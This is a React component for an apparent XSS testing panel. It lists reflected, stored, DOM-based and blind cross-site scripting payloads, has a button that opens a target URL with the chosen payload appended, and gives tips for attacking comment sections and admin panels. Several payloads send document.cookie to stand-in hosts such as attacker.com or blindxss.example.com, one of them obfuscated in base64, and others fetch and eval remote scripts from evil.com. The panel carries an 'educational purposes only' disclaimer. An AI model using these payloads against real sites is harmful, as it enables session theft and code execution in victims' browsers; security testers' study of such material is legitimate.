
import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { useToast } from '@/hooks/use-toast';
import { Copy } from 'lucide-react';

const XSSPanel: React.FC = () => {
  const [target, setTarget] = useState('');
  const [xssType, setXssType] = useState('Reflected');
  const [selectedPayload, setSelectedPayload] = useState(0);
  const { toast } = useToast();

  const xssTypes = [
    'Reflected',
    'Stored',
    'DOM-based',
    'Blind XSS'
  ];

  const payloads = {
    'Reflected': [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<body onload="alert(\'XSS\')">',
      '"><script>alert(document.cookie)</script>',
      '<svg onload="alert(\'XSS\')">'
    ],
    'Stored': [
      '<script>fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)</script>',
      '<img src=x onerror="eval(atob(\'ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tL3N0ZWFsP2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZSk=\'))">',
      '<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>',
      '<script>new Image().src="https://attacker.com/steal?output="+document.cookie;</script>',
      '<iframe src="javascript:alert(document.cookie)"></iframe>'
    ],
    'DOM-based': [
      '<a href="javascript:alert(document.cookie)">Click me</a>',
      '<img src="x" onerror="location=\'javascript:alert(document.domain)\'">',
      '"><input onfocus="alert(document.cookie)" autofocus>',
      '<div onclick="location=\'javascript:alert(1)\'">Click me</div>',
      '<math><maction actiontype="statusline#" xlink:href="javascript:alert(document.cookie)">Click</maction></math>'
    ],
    'Blind XSS': [
      '<script src="https://xss.report/s/yourreportkey"></script>',
      '"><script src="https://blindxss.example.com/collector.js"></script>',
      '<img src=x onerror="fetch(\'https://blindxss.example.com/\'+document.cookie)">',
      '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//evil.com");a.send();</script>',
      '<script>$.getScript("https://blindxss.example.com/payload.js")</script>'
    ]
  };

  const handleTest = () => {
    if (!target) {
      toast({
        title: "Error",
        description: "Please enter a target URL",
        variant: "destructive"
      });
      return;
    }
    
    toast({
      title: "XSS Test",
      description: `Testing ${xssType} XSS on ${target} with selected payload`,
    });
  };

  const copyPayload = (payload: string) => {
    navigator.clipboard.writeText(payload);
    toast({
      title: "Copied!",
      description: "XSS payload copied to clipboard",
    });
  };

  return (
    <div className="flex flex-col h-full p-4 text-white bg-[#252526] overflow-auto">
      <h2 className="text-xl font-semibold mb-4">Cross-Site Scripting (XSS) Testing</h2>
      <p className="mb-4 text-sm text-gray-400">
        This module provides tools to test for XSS vulnerabilities. For educational and security testing purposes only.
      </p>
      
      <div className="space-y-4 mb-6">
        <div>
          <label className="block text-sm mb-1">Target URL</label>
          <Input
            value={target}
            onChange={(e) => setTarget(e.target.value)}
            placeholder="https://example.com/search?q="
            className="bg-[#1e1e1e] border-[#333] w-full"
          />
        </div>
        
        <div>
          <label className="block text-sm mb-1">XSS Type</label>
          <select
            value={xssType}
            onChange={(e) => {
              setXssType(e.target.value);
              setSelectedPayload(0);
            }}
            className="w-full rounded bg-[#1e1e1e] border border-[#333] p-2"
          >
            {xssTypes.map((type) => (
              <option key={type} value={type}>{type}</option>
            ))}
          </select>
        </div>
      </div>
      
      <div className="mb-4">
        <label className="block text-sm mb-2">Payloads</label>
        <div className="space-y-2 max-h-60 overflow-y-auto">
          {payloads[xssType as keyof typeof payloads].map((payload, index) => (
            <div 
              key={index} 
              className={`p-2 rounded flex justify-between items-center ${selectedPayload === index ? 'bg-blue-900' : 'bg-[#1a1a1a]'} cursor-pointer`}
              onClick={() => setSelectedPayload(index)}
            >
              <pre className="font-mono text-xs overflow-x-auto whitespace-pre-wrap">{payload}</pre>
              <Button 
                size="sm" 
                variant="ghost" 
                onClick={(e) => {
                  e.stopPropagation();
                  copyPayload(payload);
                }}
              >
                <Copy size={14} />
              </Button>
            </div>
          ))}
        </div>
      </div>
      
      <div className="flex space-x-2 mb-4">
        <Button
          onClick={handleTest}
          className="flex-1 bg-blue-600 hover:bg-blue-700"
        >
          Test Selected Payload
        </Button>
        
        <Button
          onClick={() => window.open(`${target}${payloads[xssType as keyof typeof payloads][selectedPayload]}`, '_blank')}
          variant="outline"
          className="border-[#333] text-gray-300"
        >
          Open in Browser
        </Button>
      </div>
      
      <div>
        <h3 className="text-sm font-medium mb-2">Tips for {xssType} XSS Testing:</h3>
        <ul className="text-xs text-gray-400 list-disc pl-5 space-y-1">
          {xssType === 'Reflected' && (
            <>
              <li>Look for parameters in URLs that reflect input back to the page</li>
              <li>Test search forms, login forms, and other user input fields</li>
              <li>Check if input sanitization can be bypassed with encoding or obfuscation</li>
            </>
          )}
          {xssType === 'Stored' && (
            <>
              <li>Target areas where content is saved and displayed to other users</li>
              <li>Test comment sections, user profiles, and forums</li>
              <li>Use fetch or XMLHttpRequest to exfiltrate data to demonstrate impact</li>
            </>
          )}
          {xssType === 'DOM-based' && (
            <>
              <li>Focus on client-side JavaScript that processes URL fragments (#)</li>
              <li>Test parameters used with document.write, innerHTML, or eval()</li>
              <li>Look for JavaScript that takes input from URL parameters</li>
            </>
          )}
          {xssType === 'Blind XSS' && (
            <>
              <li>Use a payload that calls back to your server when executed</li>
              <li>Target admin panels, contact forms, and error logs</li>
              <li>Set up a collector endpoint to receive callbacks</li>
            </>
          )}
        </ul>
      </div>
    </div>
  );
};

export default XSSPanel;
